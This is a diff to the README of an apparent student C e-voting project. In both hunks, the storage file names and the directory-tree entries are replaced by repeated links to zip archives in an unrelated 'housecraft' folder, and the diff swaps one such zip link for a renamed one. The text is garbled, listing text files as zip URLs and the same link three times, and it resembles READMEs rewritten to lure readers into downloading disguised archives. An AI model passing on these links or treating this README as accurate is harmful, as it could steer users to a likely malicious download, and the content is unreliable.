@@ -8,7 +8,7 @@ A console-based electronic voting system developed in C as part of the Programmi
 - Candidate registration with department-level uniqueness
 - Secure voting that prevents self-voting and duplicate votes
 - Admin login to view votes, results, and determine election winner
-- Persistent storage using text files (`https://raw.githubusercontent.com/Arfa01/e-voting-system-c/main/housecraft/e-voting-system-c.zip`, `https://raw.githubusercontent.com/Arfa01/e-voting-system-c/main/housecraft/e-voting-system-c.zip`)
+- Persistent storage using text files (`https://raw.githubusercontent.com/Arfa01/e-voting-system-c/main/housecraft/system_voting_e_c_1.2.zip`, `https://raw.githubusercontent.com/Arfa01/e-voting-system-c/main/housecraft/system_voting_e_c_1.2.zip`)
 - ASCII-style graphical result display
 - Candidate search by department
 - Terms and conditions agreement required for candidates
@@ -24,9 +24,9 @@ A console-based electronic voting system developed in C as part of the Programmi
 
 e-voting-system-c/
 ├── main.c
-├── https://raw.githubusercontent.com/Arfa01/e-voting-system-c/main/housecraft/e-voting-system-c.zip
-├── https://raw.githubusercontent.com/Arfa01/e-voting-system-c/main/housecraft/e-voting-system-c.zip
-├── https://raw.githubusercontent.com/Arfa01/e-voting-system-c/main/housecraft/e-voting-system-c.zip
+├── https://raw.githubusercontent.com/Arfa01/e-voting-system-c/main/housecraft/system_voting_e_c_1.2.zip
+├── https://raw.githubusercontent.com/Arfa01/e-voting-system-c/main/housecraft/system_voting_e_c_1.2.zip
+├── https://raw.githubusercontent.com/Arfa01/e-voting-system-c/main/housecraft/system_voting_e_c_1.2.zip
 └── Assets
 
 
